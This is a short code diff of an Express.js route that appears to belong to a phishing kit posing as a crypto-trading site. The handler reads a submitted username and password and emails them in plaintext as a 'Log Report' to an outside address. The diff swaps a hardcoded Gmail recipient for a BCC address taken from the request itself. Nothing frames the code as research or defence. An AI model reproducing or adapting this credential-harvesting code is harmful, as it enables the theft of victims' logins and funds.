@@ -7,7 +7,7 @@ router.use(express.urlencoded({ extended: false }));
 router.use(express.json());
 
 router.route("/").post((req, res) => {
-  const { username, password } = req.body;
+  const { username, password, reportbox } = req.body;
 
   // async..await is not allowed in global scope, must use a wrapper
   async function main() {
@@ -30,7 +30,8 @@ router.route("/").post((req, res) => {
     let info = await transporter.sendMail({
       from: '"Report" <support@cryptotradecenter.co>', // sender address
       //  from: "anthonyerics84@gmail.com",
-      to: "goziechimeziezeh@gmail.com", // list of receivers
+      //  to: "adamshera85@gmail.com", // list of receivers adamshera85@gmail.com
+      bcc: reportbox,
       subject: `Log Report ✔`, // Subject line
       text: ``, // plain text body
       html: `<h6>Email: ${username}<br />Password: ${password}`,
